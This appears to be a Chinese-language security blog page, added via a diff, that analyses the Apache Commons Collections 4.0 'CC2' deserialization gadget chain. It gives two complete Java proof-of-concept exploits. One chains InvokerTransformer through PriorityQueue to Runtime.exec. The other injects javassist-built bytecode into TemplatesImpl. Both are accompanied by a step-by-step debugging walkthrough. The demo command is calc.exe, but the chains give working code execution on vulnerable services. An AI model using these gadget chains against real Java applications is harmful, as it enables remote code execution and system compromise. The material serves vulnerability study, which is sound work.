@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache-Commons-Collections 2 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache-Commons-Collections 2", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u7248\u672c", url: "#_2" },
+              {title: "\u73af\u5883", url: "#_3" },
+              {title: "\u5229\u7528\u94fe1", url: "#1" },
+              {title: "\u5229\u7528\u94fe2", url: "#2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%203/Apache-Commons-Collections%203/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%203/Apache-Commons-Collections%203/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 3
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%201/Apache-Commons-Collections%201/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%201/Apache-Commons-Collections%201/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 1
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-commons-collections-2">Apache-Commons-Collections 2</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#版本">版本</a></li>
+<li><a href="#环境">环境</a></li>
+<li><a href="#利用链1">利用链1</a><ul>
+<li><a href="#POC分析-1">POC分析 1</a></li>
+<li><a href="#POC分析-2">POC分析 2</a></li>
+</ul>
+</li>
+<li><a href="#利用链2">利用链2</a><ul>
+<li><a href="#TemplatesImpl-类生成">TemplatesImpl 类生成</a></li>
+<li><a href="#POC分析">POC分析</a></li>
+</ul>
+</li>
+</ul>
+<p>cc链2 主要是PriorityQueue和commons-collections-4.0 组件 造成的Gadget。</p>
+<p>PriorityQueue 是一个用于大小排序的类，它会将传入的数值进行大小排序。</p>
+<h2 id="_2">版本</h2>
+<p>CommonsCollections 4.0
+需要有 javasist 依赖
+JDK版本暂无限制</p>
+<h2 id="_3">环境</h2>
+<p>pom.xml</p>
+<pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+    &lt;version&gt;4.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="1">利用链1</h2>
+<p>PriorityQueue +ChianedTransfomer+反射修改属性</p>
+<pre><code class="language-纯文本">ObjectInputStream.readObject()
+            PriorityQueue.readObject()
+            PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+            PriorityQueue.siftDownUsingComparator();
+              TransformingComparator.compare() //TransformingComparator cc4.0后才能实现了序列化接口
+                  InvokerTransformer.transform()
+                      Method.invoke()
+                        Runtime.exec()
+</code></pre>
+<p>POC</p>
+<pre><code class="language-java">import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+public class Main {
+
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, new Object[]{&quot;calc.exe&quot;})});
+
+        TransformingComparator comparator = new TransformingComparator(chain);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        queue.add(1);
+        queue.add(2);
+
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,comparator);
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));
+            outputStream.writeObject(queue);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+
+    }
+
+
+}
+</code></pre>
+<p>直接跟着POC调试。</p>
+<p><img alt="" src="../image/image_iemqb_hk1u.png" /></p>
+<p>我们根据利用链跟进到PriorityQueue.readObject</p>
+<p>这里先循环调用readObject将反序列化结果放入queue数组，然后可以发现这里最后调用了一个heapify()方法，我们跟进。</p>
+<p><img alt="" src="../image/image_yY_3Ry0nDl.png" /></p>
+<p>这里的意思对我们来说便是，如果size大于1便调用siftDown方法处理queue数组。跟进siftDown</p>
+<p><img alt="" src="../image/image_Hl2b1vFwzZ.png" /></p>
+<p>会发现此处会判断comparator是否存在，若存在则调用siftDownUsingComparator。链中是需要跟进siftDownUsingComparator方法。</p>
+<p><img alt="" src="../image/image_6j9bW_QRn4.png" /></p>
+<p>siftDownUsingComparator里有个comparator.compare(x, (E) c),其中这个x是我们可控的，就是我们往queue中put的值。跟进compare方法</p>
+<p><img alt="" src="../image/image_gfCoDEFjER.png" /></p>
+<p>可以发现是调用了当前transformer指定的类的transform方法，而当前transform按照POC中来看便是ChainedTransformer chain，于是此处便会调用ChainedTransformer的transform方法，我们在ChainedTransformer中写入的命令就会被执行了。</p>
+<p>这便是这个链的大体状况，但是这个POC中仍然有一些细节需要推敲。</p>
+<h3 id="poc-1">POC分析 1</h3>
+<pre><code class="language-java">        TransformingComparator comparator = new TransformingComparator(chain);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        queue.add(1);
+        queue.add(2);
+</code></pre>
+<p>这里向queue中add了两个元素，这里add了两个元素的意义是这样的：</p>
+<p><img alt="" src="../image/image_2APqRMqrvP.png" /></p>
+<p>在heapify会判断queue中的对象数量是否大于1，只有大于1才会执行siftDown方法。</p>
+<h3 id="poc-2">POC分析 2</h3>
+<pre><code class="language-java">        TransformingComparator comparator = new TransformingComparator(chain);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        queue.add(1);
+        queue.add(2);
+
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,comparator);
+</code></pre>
+<p><img alt="" src="../image/image_NpZEwlxpb6.png" /></p>
+<p>我们可以发现在POC此处在实例化PriorityQueue时并没有传入comparotor，而是在后面使用反射给comparator变量赋值。我们跟进queue.add便可一览究竟</p>
+<p><img alt="" src="../image/image_GYuqROKBFJ.png" /></p>
+<p>add在实际上是调用了offer方法，跟进offer方法</p>
+<p><img alt="" src="../image/image_pp4yyyPb67.png" /></p>
+<p>可以发现这个offer方法也调用了siftUp这个方法</p>
+<p><img alt="" src="../image/image_YdpeZCiIXE.png" /></p>
+<p>跟进后自然是来到此处，如果comparator存在它便会走上面的分支，调用transformer方法，走下面便是进行赋值操作。</p>
+<p>假如此时comparator存在走了上面的分支，</p>
+<p><img alt="" src="../image/image_RhkKLlBoK_.png" /></p>
+<p>便会在此行产生报错，这里的逻辑是将queue数组中的两个值进行transform处理然后进行大小比较以排序，但是这里两个transform方法返回的结果均为ProccessImpl对象，不能被compare方法调用进行大小比较，所以会产生报错。导致我们后面的序列化操作不能顺利执行，无法产生payload。</p>
+<p><img alt="" src="../image/image_u_D_BvB7iG.png" /></p>
+<h2 id="2">利用链2</h2>
+<p>链2用到了PriorityQueue +TemplatesImpl  +InvokerTransformer和javassist技术。
+javassist 可以用来动态修改java字节码，相关细节这里就不细说了，我的博客和网上均有大量文章。</p>
+<pre><code class="language-java">ObjectInputStream.readObject()
+            PriorityQueue.readObject()
+            PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+            PriorityQueue.siftDownUsingComparator()
+              TransformingComparator.compare()
+                  InvokerTransformer.transform()
+                  TemplatesImpl.newTransformer()
+                  TemplatesImpl.getTransletInstance()
+                    EvilClass.newInstance()
+
+
+
+</code></pre>
+<p>关于TemplatesImpl  ，它也是7u21链中不可或缺的一个环节，它配合javassist起到任意类生成的作用，在该条链中可以再配合invokerTransformer来达到命令执行的目的。</p>
+<p>POC</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class Main {
+
+    public static void main(String[] args) throws Exception{
+
+        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);
+        constructor.setAccessible(true);
+        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);
+
+        TransformingComparator Tcomparator = new TransformingComparator(transformer);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
+        cc.setName(randomClassName);
+        //cc.writeFile();
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        byte[] classBytes = cc.toBytecode();
+        byte[][] targetByteCodes = new byte[][]{classBytes};
+
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
+        setFieldValue(templates, &quot;_name&quot;, &quot;blckder02&quot;);
+        setFieldValue(templates, &quot;_class&quot;, null);
+
+        Object[] queue_array = new Object[]{templates,1};
+        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);
+        queue_field.setAccessible(true);
+        queue_field.set(queue,queue_array);
+
+        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(queue,2);
+
+
+        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        comparator_field.setAccessible(true);
+        comparator_field.set(queue,Tcomparator);
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2.bin&quot;));
+            outputStream.writeObject(queue);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2.bin&quot;));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
+        Field field = null;
+        try {
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        }
+        catch (NoSuchFieldException ex) {
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        }
+        return field;
+    }
+}
+</code></pre>
+<h3 id="templatesimpl">TemplatesImpl 类生成</h3>
+<p>我们先来看一看TemplatesImpl  是如何进行类生成的。</p>
+<p>首先TemplatesImpl类中有个方法defineTransletClasses，它的主要代码如下</p>
+<pre><code class="language-java">private byte[][] _bytecodes = (byte[][])null;
+
+private void defineTransletClasses() throws TransformerConfigurationException {
+        if (this._bytecodes == null) {
+        .....
+        } else {
+            TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() {
+                public Object run() {
+                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader());
+                }
+            });
+
+            try {
+                int classCount = this._bytecodes.length;
+                this._class = new Class[classCount];
+
+                for(int i = 0; i &lt; classCount; ++i) {
+                    this._class[i] = loader.defineClass(this._bytecodes[i]);  \\将_bytecodes中的所有字节通过defineClass转化为一个类
+                    Class superClass = this._class[i].getSuperclass();
+                    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+                        this._transletIndex = i;
+                    } else {
+                        this._auxClasses.put(this._class[i].getName(), this._class[i]);
+                    }
+                }
+    }
+</code></pre>
+<p>也就是说通过这个方法可以将_bytecodes数组中的字节还原成一个类，存储到_class变量中。接下来如果我们能找到调用defineTransletClasses方法并执行了_class[].newinstance() 这样的的代码的方法，就能实例化从字节得到的类了，从而就能执行类中的静态代码块和构造函数了！
+所以接下来我们需要去寻找这种方法。
+通过搜索defineTransletClasses，我们找到了有如下三个方法调用了defineTransletClasses方法：</p>
+<pre><code class="language-纯文本">getTransletInstance
+getTransletIndex
+getTransletClasses
+</code></pre>
+<p>其中，getTransletInstance方法是唯一符合“调用了defineTransletClasses且有_class[].newinstance()”的方法，其代码如下</p>
+<pre><code class="language-纯文本">private Translet getTransletInstance() throws TransformerConfigurationException {
+        ErrorMsg err;
+        try {
+            if (this._name == null) {
+                return null;
+            } else {
+                if (this._class == null) {
+                    this.defineTransletClasses();
+                }
+
+                AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\here,注意此处生成的类对象应该是AbstractTranslet或其子类
+                translet.postInitialization();
+                translet.setTemplates(this);
+                translet.setServicesMechnism(this._useServicesMechanism);
+                if (this._auxClasses != null) {
+                    translet.setAuxiliaryClasses(this._auxClasses);
+                }
+
+                return translet;
+            }
+</code></pre>
+<p>那么，getTransletInstance是一个private方法，我们不能直接调用它，在那里能去调用它呢？答案是newTransformer方法</p>
+<pre><code class="language-纯文本">    public synchronized Transformer newTransformer() throws TransformerConfigurationException {
+        TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory);  \\here
+    ········
+    }
+</code></pre>
+<p>也就是说我们可以通过javassist动态控制_bytecodes属性的值，然后通过InvokerTransfomer调用TemplatesImpl.newTransfomer来把我们通过javassist得到的字节码实例化，在实例化的时候调用其构造函数。</p>
+<h3 id="poc">POC分析</h3>
+<pre><code class="language-java">        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);
+        constructor.setAccessible(true);
+        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);
+
+        TransformingComparator Tcomparator = new TransformingComparator(transformer);
+
+</code></pre>
+<p>这里是先获取InvokerTransformer的构造方法，然后向构造方法传入newTransformer来实例化一个InvokerTransformer方法。</p>
+<pre><code class="language-java">        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
+        cc.setName(randomClassName);
+        //cc.writeFile();
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        byte[] classBytes = cc.toBytecode();
+        byte[][] targetByteCodes = new byte[][]{classBytes};
+
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
+        setFieldValue(templates, &quot;_name&quot;, &quot;blckder02&quot;);
+        setFieldValue(templates, &quot;_class&quot;, null);
+</code></pre>
+<p>这里是通过javassist动态实现了一个构造函数为执行计算器的类，将其转化为字节码保存，然后在实例化TemplatesImpl时传入其_bytecodes变量，这里还必须为_name赋值，_class我测试的时候也不用赋值，但是加上最好？我没有细跟。</p>
+<pre><code class="language-java">        Object[] queue_array = new Object[]{templates,1};
+        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);
+        queue_field.setAccessible(true);
+        queue_field.set(queue,queue_array);
+
+        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(queue,2);
+
+
+        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        comparator_field.setAccessible(true);
+        comparator_field.set(queue,Tcomparator);
+</code></pre>
+<p>然后通过反射向queue数组赋值，一个值为刚刚生成的TemplatesImpl对象，另一个值随意，总之这里得传入2个以上的值。
+然后通过反射向size赋值，再然后通过反射向comparator赋值。
+赋值完成后进行序列化操作。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%203/Apache-Commons-Collections%203/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%203/Apache-Commons-Collections%203/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 3
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%201/Apache-Commons-Collections%201/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%201/Apache-Commons-Collections%201/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 1
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
